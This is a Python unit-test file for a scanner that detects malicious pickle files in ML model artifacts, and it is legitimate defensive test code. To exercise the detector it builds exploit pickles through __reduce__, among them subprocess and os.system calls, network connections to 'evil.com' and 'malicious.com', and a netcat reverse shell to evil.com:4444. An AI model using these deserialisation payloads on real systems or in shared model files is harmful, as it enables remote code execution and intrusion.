"""Unit tests for PickleScanScanner."""
import pytest
import tempfile
import os
import sys
from pathlib import Path

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from src.static_scan.scanners.picklescan_scanner import PickleScanScanner
from tests.fixtures.malicious_pickles import (
    generate_malicious_pickles,
    generate_benign_pickles,
    generate_pytorch_exploits,
    generate_numpy_exploits
)


class TestPickleScanScanner:
    """Unit tests for PickleScan scanner."""
    
    @pytest.fixture
    def scanner(self):
        """Create scanner instance."""
        return PickleScanScanner()
    
    @pytest.fixture
    def temp_dir(self):
        """Create temporary directory for test files."""
        with tempfile.TemporaryDirectory() as tmpdir:
            yield tmpdir
    
    def test_scan_malicious_pickle_files(self, scanner, temp_dir):
        """Test detection of various malicious pickle files."""
        malicious_pickles = generate_malicious_pickles()
        
        # Write malicious pickles to temp directory
        for name, pickle_bytes in malicious_pickles.items():
            file_path = os.path.join(temp_dir, f"{name}.pkl")
            with open(file_path, 'wb') as f:
                f.write(pickle_bytes)
        
        # Scan directory
        result = scanner.scan(temp_dir)
        
        # Should detect malicious patterns
        assert result.verdict in ["SUSPICIOUS", "MALICIOUS"]
        assert result.issues_count > 0
        assert len(result.affected_files) > 0
        
        # Check for dangerous functions in scanner output
        scanner_output = str(result.scanner_data)
        dangerous_patterns = ['os.system', 'eval', 'exec', 'subprocess', '__import__']
        assert any(pattern in scanner_output.lower() for pattern in dangerous_patterns)
    
    def test_scan_benign_pickle_files(self, scanner, temp_dir):
        """Test that benign pickles are marked safe."""
        benign_pickles = generate_benign_pickles()
        
        # Write benign pickles to temp directory
        for name, pickle_bytes in benign_pickles.items():
            file_path = os.path.join(temp_dir, f"{name}.pkl")
            with open(file_path, 'wb') as f:
                f.write(pickle_bytes)
        
        # Scan directory
        result = scanner.scan(temp_dir)
        
        # Should be safe
        assert result.verdict == "SAFE"
        assert result.issues_count == 0
    
    def test_scan_pytorch_files(self, scanner, temp_dir):
        """Test scanning of PyTorch model files."""
        pytorch_exploits = generate_pytorch_exploits()
        
        # Write PyTorch files
        for name, file_bytes in pytorch_exploits.items():
            ext = '.pth' if 'pth' in name else '.pt'
            file_path = os.path.join(temp_dir, f"{name}{ext}")
            with open(file_path, 'wb') as f:
                f.write(file_bytes)
        
        # Scan directory
        result = scanner.scan(temp_dir)
        
        # Should detect malicious PyTorch files
        assert result.verdict in ["SUSPICIOUS", "MALICIOUS"]
        assert result.issues_count > 0
        
        # Check that PyTorch files were scanned
        scanned_extensions = [Path(f).suffix for f in result.files_scanned]
        assert '.pth' in scanned_extensions or '.pt' in scanned_extensions
    
    def test_scan_numpy_files(self, scanner, temp_dir):
        """Test scanning of NumPy array files."""
        numpy_exploits = generate_numpy_exploits()

        # Write NumPy exploit files
        for name, file_bytes in numpy_exploits.items():
            ext = '.npz' if 'npz' in name else '.npy'
            file_path = os.path.join(temp_dir, f"{name}{ext}")
            with open(file_path, 'wb') as f:
                f.write(file_bytes)

        # Scan directory
        result = scanner.scan(temp_dir)

        # Should handle numpy files gracefully
        assert result is not None, "Expected scan result to be returned"

        # Should scan the numpy files
        assert result.files_scanned, "Expected files to be scanned"
        assert len(result.files_scanned) > 0, f"Expected numpy files to be scanned, got {result.files_scanned}"

        # Should detect malicious numpy exploits
        assert result.verdict in ["SUSPICIOUS", "MALICIOUS"], \
            f"Expected malicious verdict for numpy exploits, got {result.verdict}"
        assert result.issues_count > 0, f"Expected issues to be detected, got {result.issues_count}"
        assert result.affected_files, f"Expected affected_files to be non-empty"
    
    def test_scan_empty_directory(self, scanner, temp_dir):
        """Test scanning empty directory."""
        result = scanner.scan(temp_dir)
        
        # Should handle empty directory gracefully
        assert result.verdict == "SAFE"
        assert result.issues_count == 0
        assert result.files_scanned == []
    
    def test_scan_mixed_files(self, scanner, temp_dir):
        """Test scanning directory with mixed safe and malicious files."""
        # Add some benign files
        benign = generate_benign_pickles()
        for i, (name, data) in enumerate(list(benign.items())[:2]):
            with open(os.path.join(temp_dir, f"benign_{i}.pkl"), 'wb') as f:
                f.write(data)
        
        # Add some malicious files
        malicious = generate_malicious_pickles()
        for i, (name, data) in enumerate(list(malicious.items())[:2]):
            with open(os.path.join(temp_dir, f"malicious_{i}.pkl"), 'wb') as f:
                f.write(data)
        
        # Add non-pickle files
        with open(os.path.join(temp_dir, "readme.txt"), 'w') as f:
            f.write("Test file")
        
        result = scanner.scan(temp_dir)
        
        # Should detect malicious files
        assert result.verdict in ["SUSPICIOUS", "MALICIOUS"]
        assert result.issues_count > 0
        assert len(result.affected_files) > 0
    
    def test_scan_nested_archives(self, scanner, temp_dir):
        """Test scanning pickle files inside archives."""
        import zipfile
        
        # Create malicious pickle
        exploit = generate_malicious_pickles()
        pickle_data = list(exploit.values())[0]
        
        # Create ZIP with pickle inside (picklescan supports this)
        zip_path = os.path.join(temp_dir, "archive.zip")
        with zipfile.ZipFile(zip_path, 'w') as zf:
            zf.writestr("exploit.pkl", pickle_data)
            zf.writestr("data/model.pkl", pickle_data)
        
        # Scan should detect malicious pickle in archive
        result = scanner.scan(temp_dir)
        
        # Picklescan should detect the malicious content in the ZIP
        assert result is not None
        assert result.verdict in ["SUSPICIOUS", "MALICIOUS"]
        assert result.issues_count > 0
    
    def test_scan_corrupted_pickle(self, scanner, temp_dir):
        """Test handling of corrupted pickle files."""
        # Create corrupted pickle
        corrupted_path = os.path.join(temp_dir, "corrupted.pkl")
        with open(corrupted_path, 'wb') as f:
            f.write(b'\x80\x04')  # Valid protocol
            f.write(b'CORRUPTED DATA THAT IS NOT VALID PICKLE')
        
        # Should handle corruption gracefully
        result = scanner.scan(temp_dir)
        
        # Should not crash
        assert result is not None
        # Might be marked safe if it can't be parsed
        assert result.verdict in ["SAFE", "SUSPICIOUS"]
    
    def test_scan_large_pickle(self, scanner, temp_dir):
        """Test scanning of large pickle files."""
        # Create large benign pickle (10MB of data)
        large_data = {
            f'key_{i}': list(range(1000))
            for i in range(1000)
        }
        import pickle
        large_pickle = pickle.dumps(large_data)
        
        large_path = os.path.join(temp_dir, "large.pkl")
        with open(large_path, 'wb') as f:
            f.write(large_pickle)
        
        # Should handle large files efficiently
        import time
        start_time = time.time()
        result = scanner.scan(temp_dir)
        scan_time = time.time() - start_time
        
        # Should complete in reasonable time (< 10 seconds)
        assert scan_time < 10
        assert result.verdict == "SAFE"
    
    def test_scan_different_protocols(self, scanner, temp_dir):
        """Test scanning pickles with different protocol versions."""
        import pickle
        
        # Create exploit class
        class ProtocolExploit:
            def __reduce__(self):
                import subprocess
                return (subprocess.call, (['echo', 'exploit'],))
        
        # Test different pickle protocols (0-5)
        for protocol in range(6):
            try:
                exploit = ProtocolExploit()
                filename = f"protocol_{protocol}.pkl"
                filepath = os.path.join(temp_dir, filename)
                with open(filepath, 'wb') as f:
                    pickle.dump(exploit, f, protocol=protocol)
            except Exception:
                # Some protocols might not be supported
                continue
        
        # Scan all protocols
        result = scanner.scan(temp_dir)
        
        # Should detect exploits in all protocol versions
        assert result.verdict in ["SUSPICIOUS", "MALICIOUS"]
        assert result.issues_count > 0
        assert len(result.files_scanned) > 0
    
    def test_scan_network_exploits(self, scanner, temp_dir):
        """Test detection of network-related exploits (http, socket, requests)."""
        import pickle
        
        # Create various network exploits
        class HttpConnectionExploit:
            def __reduce__(self):
                import http.client
                return (http.client.HTTPSConnection, ('malicious.com', 443))
        
        class SocketExploit:
            def __reduce__(self):
                import socket
                return (socket.create_connection, (('evil.com', 4444),))
        
        class RequestsExploit:
            def __reduce__(self):
                # Try to import and use requests
                return (__import__, ('requests',))
        
        # Save network exploits
        exploits = [
            ('http_exploit.pkl', HttpConnectionExploit()),
            ('socket_exploit.pkl', SocketExploit()),
            ('requests_exploit.pkl', RequestsExploit()),
        ]
        
        for filename, exploit in exploits:
            filepath = os.path.join(temp_dir, filename)
            with open(filepath, 'wb') as f:
                pickle.dump(exploit, f)
        
        # Scan directory
        result = scanner.scan(temp_dir)
        
        # Should detect network-related exploits
        assert result.verdict in ["SUSPICIOUS", "MALICIOUS"]
        assert result.issues_count > 0
        
        # Check for network-related modules in findings
        scanner_output = str(result.scanner_data).lower()
        network_indicators = ['http', 'socket', 'requests', 'connection']
        assert any(indicator in scanner_output for indicator in network_indicators)
    
    def test_scan_debugger_exploits(self, scanner, temp_dir):
        """Test detection of debugger and development tool exploits."""
        import pickle
        
        # Create debugger/dev tool exploits
        class BdbExploit:
            def __reduce__(self):
                import bdb
                return (bdb.Bdb, ())
        
        class PdbExploit:
            def __reduce__(self):
                import pdb
                return (pdb.Pdb, ())
        
        # Save debugger exploits
        exploits = [
            ('bdb_exploit.pkl', BdbExploit()),
            ('pdb_exploit.pkl', PdbExploit()),
        ]
        
        for filename, exploit in exploits:
            filepath = os.path.join(temp_dir, filename)
            with open(filepath, 'wb') as f:
                pickle.dump(exploit, f)
        
        # Scan directory
        result = scanner.scan(temp_dir)
        
        # Should detect debugger exploits
        assert result.verdict in ["SUSPICIOUS", "MALICIOUS"]
        assert result.issues_count > 0
        
        # Check for debugger modules in findings
        scanner_output = str(result.scanner_data).lower()
        assert 'bdb' in scanner_output or 'pdb' in scanner_output
    
    def test_scan_package_management_exploits(self, scanner, temp_dir):
        """Test detection of package management exploits (pip, venv)."""
        import pickle
        
        # Create package management exploits
        class PipExploit:
            def __reduce__(self):
                # Import pip module
                return (__import__, ('pip',))
        
        class VenvExploit:
            def __reduce__(self):
                import venv
                return (venv.create, ('/tmp/malicious_env',))
        
        class SetuptoolsExploit:
            def __reduce__(self):
                # Import setuptools
                return (__import__, ('setuptools',))
        
        # Save package management exploits
        exploits = [
            ('pip_exploit.pkl', PipExploit()),
            ('venv_exploit.pkl', VenvExploit()),
            ('setuptools_exploit.pkl', SetuptoolsExploit()),
        ]
        
        for filename, exploit in exploits:
            filepath = os.path.join(temp_dir, filename)
            with open(filepath, 'wb') as f:
                pickle.dump(exploit, f)
        
        # Scan directory
        result = scanner.scan(temp_dir)
        
        # Should detect package management exploits
        assert result.verdict in ["SUSPICIOUS", "MALICIOUS"]
        assert result.issues_count > 0
        
        # Check for package management modules in findings
        scanner_output = str(result.scanner_data).lower()
        package_indicators = ['pip', 'venv', 'setuptools']
        assert any(indicator in scanner_output for indicator in package_indicators)
    
    def test_scan_async_exploits(self, scanner, temp_dir):
        """Test detection of async/concurrent exploits."""
        import pickle
        
        # Create async/concurrent exploits
        class AioHttpExploit:
            def __reduce__(self):
                # Try to import aiohttp
                return (__import__, ('aiohttp',))
        
        class AsyncioExploit:
            def __reduce__(self):
                import asyncio
                return (asyncio.create_subprocess_shell, ('nc -e /bin/sh evil.com 4444',))
        
        class ThreadingExploit:
            def __reduce__(self):
                import threading
                import os
                return (threading.Thread, (), {'target': os.system, 'args': ('whoami',)})
        
        # Save async exploits
        exploits = [
            ('aiohttp_exploit.pkl', AioHttpExploit()),
            ('asyncio_exploit.pkl', AsyncioExploit()),
            ('threading_exploit.pkl', ThreadingExploit()),
        ]
        
        for filename, exploit in exploits:
            filepath = os.path.join(temp_dir, filename)
            try:
                with open(filepath, 'wb') as f:
                    pickle.dump(exploit, f)
            except Exception:
                # Some exploits might fail to pickle, that's OK
                pass
        
        # Scan directory
        result = scanner.scan(temp_dir)
        
        # If any files were created and scanned
        if result.files_scanned:
            # Should detect async exploits
            assert result.verdict in ["SUSPICIOUS", "MALICIOUS", "SAFE"]
            # Check for async modules in findings if detected
            if result.verdict != "SAFE":
                scanner_output = str(result.scanner_data).lower()
                async_indicators = ['aiohttp', 'asyncio', 'threading']
                assert any(indicator in scanner_output for indicator in async_indicators)
    
    def test_scan_result_format(self, scanner, temp_dir):
        """Test that scan results match expected format."""
        # Add a malicious file
        malicious = generate_malicious_pickles()
        name, data = list(malicious.items())[0]
        mal_path = os.path.join(temp_dir, "test.pkl")
        with open(mal_path, 'wb') as f:
            f.write(data)
        
        result = scanner.scan(temp_dir)
        
        # Check result structure
        assert hasattr(result, 'scanner_name')
        assert result.scanner_name == 'picklescan'
        assert hasattr(result, 'scan_duration')
        assert result.scan_duration >= 0
        assert hasattr(result, 'verdict')
        assert result.verdict in ["SAFE", "SUSPICIOUS", "MALICIOUS"]
        assert hasattr(result, 'issues_count')
        assert isinstance(result.issues_count, int)
        assert hasattr(result, 'files_scanned')
        assert isinstance(result.files_scanned, list)
        assert hasattr(result, 'affected_files')
        assert isinstance(result.affected_files, list)
        assert hasattr(result, 'scanner_data')
        assert isinstance(result.scanner_data, dict)

    def test_pickle_in_zip_in_tar(self, scanner, temp_dir):
        """Test: Pickle → ZIP → TAR nested detection."""
        import io
        import tarfile
        import zipfile

        # Create malicious pickle
        exploit = generate_malicious_pickles()
        pickle_bytes = list(exploit.values())[0]

        # Create ZIP containing pickle
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w') as zf:
            zf.writestr('malicious.pkl', pickle_bytes)
        zip_bytes = zip_buffer.getvalue()

        # Create TAR containing ZIP
        tar_path = os.path.join(temp_dir, "outer.tar")
        with tarfile.open(tar_path, 'w') as tar:
            zip_info = tarfile.TarInfo('inner.zip')
            zip_info.size = len(zip_bytes)
            tar.addfile(zip_info, io.BytesIO(zip_bytes))

        # Should detect pickle inside nested archives (TAR → ZIP → pickle)
        result = scanner.scan(temp_dir)

        assert result.verdict in ["SUSPICIOUS", "MALICIOUS"], f"Expected SUSPICIOUS or MALICIOUS, got {result.verdict}"
        assert result.issues_count > 0, f"Expected issues_count > 0, got {result.issues_count}"
        assert result.affected_files, "Expected affected_files to be non-empty"
        # Verify the full hierarchical path exists: "outer.tar:inner.zip:malicious.pkl"
        assert any('outer.tar:inner.zip:malicious.pkl' in str(f) for f in result.affected_files), \
            f"Expected 'outer.tar:inner.zip:malicious.pkl' in {result.affected_files}"

    def test_four_level_deep_archive(self, scanner, temp_dir):
        """Test: 5-level deep archives exceed max_depth=3 and stop gracefully."""
        import io
        import zipfile

        pickle_bytes = list(generate_malicious_pickles().values())[0]

        # depth 1: pickle in zip
        zip1 = io.BytesIO()
        with zipfile.ZipFile(zip1, 'w') as z:
            z.writestr('evil.pkl', pickle_bytes)

        # depth 2: zip1 in zip2
        zip2 = io.BytesIO()
        with zipfile.ZipFile(zip2, 'w') as z:
            z.writestr('d1.zip', zip1.getvalue())

        # depth 3: zip2 in zip3
        zip3 = io.BytesIO()
        with zipfile.ZipFile(zip3, 'w') as z:
            z.writestr('d2.zip', zip2.getvalue())

        # depth 4: zip3 in zip4
        zip4 = io.BytesIO()
        with zipfile.ZipFile(zip4, 'w') as z:
            z.writestr('d3.zip', zip3.getvalue())

        # depth 5: zip4 in zip5 (exceeds max_depth=3)
        zip5_path = os.path.join(temp_dir, 'deep.zip')
        with zipfile.ZipFile(zip5_path, 'w') as z:
            z.writestr('d4.zip', zip4.getvalue())

        # Should handle gracefully by stopping at max depth
        result = scanner.scan(temp_dir)

        assert result is not None, "Expected scan result to be returned"
        assert hasattr(result, 'verdict'), "Expected result to have verdict attribute"
        # Should be SAFE because it stopped before reaching the malicious pickle
        assert result.verdict == "SAFE", f"Expected SAFE (stopped at max depth), got {result.verdict}"
        assert result.issues_count == 0, f"Expected 0 issues (didn't reach pickle), got {result.issues_count}"
        # Should have an error indicating max depth was exceeded
        assert result.errors, "Expected errors list to be non-empty when max depth exceeded"
        assert any('Max archive depth' in str(e) for e in result.errors), \
            f"Expected 'Max archive depth' error in {result.errors}"

    def test_text_file_with_pkl_extension(self, scanner, temp_dir):
        """Test: .pkl file that's actually text (should be tracked as error)."""
        fake_path = os.path.join(temp_dir, 'fake.pkl')
        with open(fake_path, 'w') as f:
            f.write('This is just text, not pickle!')

        result = scanner.scan(temp_dir)

        # Should scan the file (has .pkl extension) but fail to parse
        assert result is not None, "Expected scan result to be returned"
        assert result.files_scanned, "Expected files_scanned to be non-empty"
        assert 'fake.pkl' in [os.path.basename(f) for f in result.files_scanned], \
            f"Expected 'fake.pkl' in files_scanned: {result.files_scanned}"
        # Should be in errors (parsing failure)
        assert result.errors, "Expected errors list to be non-empty for invalid pickle file"
        assert any('fake.pkl' in str(e) for e in result.errors), \
            f"Expected 'fake.pkl' in errors: {result.errors}"
        # Verdict should be SAFE (no malicious content, just parse error)
        assert result.verdict == "SAFE", f"Expected SAFE verdict, got {result.verdict}"

    def test_python_file_skipped(self, scanner, temp_dir):
        """Test: Python source file is not scanned."""
        py_path = os.path.join(temp_dir, 'module.py')
        with open(py_path, 'w') as f:
            f.write('''import os
import sys

class Exploit:
    def run(self):
        os.system('echo pwned')
''')

        result = scanner.scan(temp_dir)

        assert result is not None, "Expected scan result to be returned"
        scanned = [os.path.basename(f) for f in result.files_scanned]
        assert 'module.py' not in scanned, f"Python file should not be scanned, but found in: {scanned}"
        assert result.verdict == "SAFE", f"Expected SAFE verdict, got {result.verdict}"
        assert result.issues_count == 0, f"Expected 0 issues, got {result.issues_count}"

    def test_binary_garbage_with_pkl_extension(self, scanner, temp_dir):
        """Test: Random binary with .pkl extension (parsing error tracked)."""
        garbage_path = os.path.join(temp_dir, 'garbage.pkl')
        with open(garbage_path, 'wb') as f:
            f.write(b'\xff\xfe\xfd\xfc' * 100)

        result = scanner.scan(temp_dir)

        # Should attempt to scan (has .pkl extension) but fail to parse
        assert result is not None, "Expected scan result to be returned"
        assert result.files_scanned, "Expected files_scanned to be non-empty"
        assert 'garbage.pkl' in [os.path.basename(f) for f in result.files_scanned], \
            f"Expected 'garbage.pkl' in files_scanned: {result.files_scanned}"
        # Parsing error should be tracked
        assert result.errors, "Expected errors list to be non-empty for invalid pickle file"
        assert any('garbage.pkl' in str(e) for e in result.errors), \
            f"Expected 'garbage.pkl' in errors: {result.errors}"
        # No malicious content found (just parsing error)
        assert result.verdict == "SAFE", f"Expected SAFE verdict, got {result.verdict}"